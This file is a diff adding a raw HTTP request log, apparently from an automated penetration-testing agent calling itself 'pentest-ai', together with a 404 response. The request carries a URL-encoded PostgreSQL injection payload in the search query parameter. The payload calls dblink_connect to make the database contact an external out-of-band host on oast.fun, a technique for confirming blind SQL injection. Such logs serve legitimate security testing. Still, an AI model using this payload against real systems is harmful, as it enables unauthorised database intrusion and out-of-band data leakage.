@@ -1,0 +1,15 @@
+REQUEST:
+GET https://meilisearch.baliprov.dev/rest/products/search?query=%27%3B%20SELECT%20dblink_connect%28%27host%3Dwu5mcudyp7wehiux6ywcunz6jer58f97b.oast.fun%20user%3Dx%20password%3Dx%20dbname%3Dx%27%29%3B--%20-
+User-Agent: pentest-ai/1.6.2 (compatible; rv:a2cfe36ea2c0; +https://pentestai.xyz)
+X-Request-ID: 7a3f9c21-4b08-4e11-9c02-a2cfe36ea2c0
+
+
+
+RESPONSE:
+HTTP 404
+Date: Wed, 25 Nov 2026 00:25:41 GMT
+Transfer-Encoding: chunked
+Connection: keep-alive
+Server: nginx/1.10.3
+Content-Encoding: gzip
+
